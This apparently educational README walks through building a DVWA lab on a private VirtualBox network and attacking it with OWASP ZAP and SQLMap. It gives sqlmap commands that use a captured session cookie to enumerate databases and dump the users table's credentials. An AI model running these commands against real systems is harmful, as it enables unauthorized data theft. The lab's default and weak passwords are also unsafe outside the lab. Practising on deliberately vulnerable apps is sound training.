# Web Application Penetration Testing with DVWA

## Overview
This project demonstrates how to set up a vulnerable web application (DVWA) and perform penetration testing using OWASP ZAP and SQLMap. It includes steps to identify and exploit SQL Injection vulnerabilities, analyze results, and implement security best practices.

## Network Configuration
- **DVWA (Vulnerable Web Application)**: 192.168.56.101
- **Kali Linux (Penetration Testing Environment)**: 192.168.56.102

## Tools Used
- **OWASP ZAP**: For web application security testing
- **SQLMap**: For automated SQL Injection testing
- **DVWA**: Damn Vulnerable Web Application for testing

## Steps

### Setting Up the Environment

#### Install VirtualBox and Create VMs
1. **Download and Install VirtualBox**
2. **Create a New VM for DVWA**:
3. **Install Ubuntu Server on the VM**:

#### Install Apache, MySQL, and PHP on Ubuntu Server
1. **Update the Package List**:
   ```bash
   sudo apt-get update
Install Apache:

```bash
sudo apt-get install apache2 -y
```



***Install MySQL:***
```bash
sudo apt-get install mysql-server -y
```
***Install PHP:***

```bash
sudo apt-get install php php-mysqli libapache2-mod-php -y
```

**Clone DVWA Repository:**
```bash
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git dvwa
```
***Set Permissions for DVWA Directory:***

```bash
sudo chown -R www-data:www-data /var/www/html/dvwa
sudo chmod -R 755 /var/www/html/dvwa
```
Configure MySQL for DVWA and CREATE Datatabase:

```bash
sudo mysql -u root -p
```
Create a database and user for DVWA:
```sql
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

Copy and edit the DVWA configuration file:
```bash
cd /var/www/html/dvwa/config
sudo cp config.inc.php.dist config.inc.php
sudo nano config.inc.php
```

Update the following lines:
```php
$_DVWA['db_server']   = 'localhost';
$_DVWA['db_database'] = 'dvwa';
$_DVWA['db_user']     = 'dvwa';
$_DVWA['db_password'] = 'password';
```
<img width="826" alt="image" src="https://github.com/Roland-P/Network-Security/assets/171095729/0e9f08d6-e7b3-41dd-8a8d-216217800929">

Restart Apache:

```bas
sudo service apache2 restart
```
<img width="800" alt="image" src="https://github.com/Roland-P/Network-Security/assets/171095729/15ac13c7-9636-48a6-8867-7445fc3acc72">
Access DVWA:

Open a web browser and navigate to ```http://192.168.56.101/dvwa/setup.php``` or localhost.
Follow the setup instructions.
Login with default credentials: admin / password.

Create a New VM for Kali Linux:
Install OWASP ZAP and SQLMap:

```bash
sudo apt-get update
sudo apt-get install zaproxy sqlmap -y
```
Performing Penetration Testing
Using OWASP ZAP

Start OWASP ZAP:

Open OWASP ZAP from the applications menu or by running zap in the terminal.
Set Up a New Session:

Go to the Quick Start tab.
Set the URL to explore to http://192.168.56.101/dvwa.
Click Launch Browser to open Firefox.
<img width="838" alt="image" src="https://github.com/Roland-P/Network-Security/assets/171095729/92587427-4b93-4472-a1be-0ce1221bf2c2">

Login to DVWA and Configure Settings:

In the launched browser, log in to DVWA with default credentials: admin / password.
Set DVWA security to medium by going to DVWA Security and selecting Medium, then clicking Submit.
Navigate to SQL Injection (Blind) under the Vulnerabilities section.

Initiate SQL Injection:

Under User ID, set the value to 1 and click Submit.

Capture the Session ID:

In OWASP ZAP, go to the History tab.
Find the last POST event.
In the Request tab, locate the PHPSESSID in the headers.

<img width="840" alt="image" src="https://github.com/Roland-P/Network-Security/assets/171095729/036fd65b-a0da-4b55-a77d-bc46542a91f7">

Identifying SQL Injection with SQLMap

Run SQLMap with Session ID:
```bash
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=abcdef1234567890" --dbs
```
Replace abcdef1234567890 with your actual session ID.

You can list all tables in the database:
```bash
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=abcdef1234567890" -D dvwa --tables
```
Dump Table Columns:
to list columns in the users table:
```bash

sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=abcdef1234567890" -D dvwa -T users --columns
```
Dump Table Data:
To extract the data from the users table:
```bash
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=abcdef1234567890" -D dvwa -T users --dump
```
<div>
<img width="585" alt="image" src="https://github.com/Roland-P/Network-Security/assets/171095729/ec382ee3-bb46-4772-90e6-0de60cd1029e">

<img width="847" alt="image" src="https://github.com/Roland-P/Network-Security/assets/171095729/f6dd9f07-c547-4184-88f9-f8ca7575677d">

<img width="1011" alt="image" src="https://github.com/Roland-P/Network-Security/assets/171095729/f604ff25-589d-4cc6-b4f1-88ae64513cc3">
</div>

### Conclusion ###

This project successfully demonstrated the process of setting up a vulnerable web application (DVWA) and performing penetration testing to identify and exploit SQL Injection vulnerabilities using OWASP ZAP and SQLMap. By conducting a SQL Injection attack on the DVWA application, we were able to successfully extract sensitive information, including usernames and passwords. This underscores the potential damage that can result from SQL Injection vulnerabilities if they are not properly addressed. The ability to manipulate SQL queries allowed us to bypass authentication mechanisms and access data that should have been securely protected.
